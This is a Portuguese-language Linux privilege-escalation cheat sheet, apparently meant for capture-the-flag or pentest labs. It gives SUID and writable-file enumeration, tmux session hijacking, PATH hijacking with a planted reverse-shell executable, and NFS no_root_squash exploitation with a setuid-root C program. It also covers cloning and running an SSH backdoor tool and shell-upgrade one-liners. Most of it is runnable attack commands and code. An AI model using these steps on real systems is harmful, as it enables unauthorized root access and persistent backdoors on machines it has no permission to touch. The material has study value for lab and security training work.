https://github.com/Herick-Costa/LinRPE/blob/main/LinRPE.sh


# ğŸ” Busca de Arquivos e PermissÃµes

## ğŸ“‚ Busca de arquivos especÃ­ficos
```bash
find / -name flag2.txt 2>/dev/null
find / -type f -name "*key.txt" 2>/dev/null
dir C:\ /s /b | findstr /i "root.txt"
```
## ğŸ” Arquivos com permissÃµes SUID/SGID
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
```

## âš™ï¸ ExecutÃ¡veis especÃ­ficos
### ğŸ“Œ ExecutÃ¡veis do root
```bash
find / -type f -perm -4000 -group $(id -gn) 2>/dev/null
```

### ğŸ“Œ ExecutÃ¡veis em grupos
```bash
find / -group <nome_do_grupo> -type f -executable 2>/dev/null
```

## ğŸ“ Pastas gravÃ¡veis
```bash
find / -writable 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
```
---

# ğŸš€ Escalonamento de PrivilÃ©gios

# ğŸ” Capacidades (Capabilities)
```bash
getcap -r / 2>/dev/null
```

---

# â³ Cronjobs
```bash
cat /etc/crontab
```

---

# ğŸ›  Ferramentas e Recursos

## VerificaÃ§Ã£o de processos | PS
```bash
ps -eo pid,ppid,user,cmd
```
### Executando linpeas na sessÃ£o 'Processes whose PPID belongs to a different user (not root)
![image](https://github.com/user-attachments/assets/dee4c2cb-0f09-4917-aae8-281ce16d13a3)

### Exemplo onde encontramos o tmux iniciado por user rodando como root (no linpeas mostra o 2385)
```bash
ps -eo pid,ppid,user,cmd | grep 2385 
```
![image](https://github.com/user-attachments/assets/abd1eb08-1c16-4870-b72a-768ba19084d2)

```bash
tmux ls  
```
![image](https://github.com/user-attachments/assets/2bd3fdac-aef5-4c16-b9d2-4c495cba095f)

### Tomando conta:
```bash
tmux attach-session -t 0  
```

## ğŸ“Œ ExploraÃ§Ã£o de PATH
### ğŸ” Examinando o PATH
```bash
echo $PATH
export PATH=/tmp:$PATH
export PATH=/tmp
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
```

### ğŸ”¹ EstratÃ©gia
1. Verificar quais pastas no `$PATH` sÃ£o gravÃ¡veis.
2. Adicionar um executÃ¡vel falso em `/tmp` com uma shell reversa.

## ğŸ–§ NFS (Network File System)
### ğŸ” ConfiguraÃ§Ã£o crÃ­tica
Verifique no `/etc/exports` a opÃ§Ã£o `no_root_squash`.

### ğŸ›  Procedimento
```bash
showmount -e <ip>
mkdir /tmp/v
mount -o rw <ip>:/tmp /tmp/v
```

### ğŸ“ CÃ³digo para exploraÃ§Ã£o
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc nfs.c -o nfs -w -static
chmod +s nfs
```

# ğŸ›  SSH Backdoor
```bash
git clone https://github.com/NinjaJc01/ssh-backdoor
cd ssh-backdoor
ssh-keygen
id_rsa
chmod +x backdoor
./backdoor -a
```
---

# ğŸ›  Expondo ServiÃ§os com TÃºneis SSH Reversos

## ğŸ“Œ Listar portas em uso
```bash
ss -tulpn
```

## Cache ARP â€“ Ãšltimos IPs na rede local
```bash
ip neigh show
```
Exemplo de saÃ­da:

Copiar
Editar
192.168.0.12 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE
Isso mostra IPs que sua mÃ¡quina descobriu via rede local recentemente (ainda que nÃ£o esteja mais se comunicando).

# ğŸ”¥ Melhorando Shells

## ğŸ§Linux
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
export TERM=xterm
^Z
stty raw -echo; fg
reset
```
```bash
script /dev/null
/bin/sh -i
```
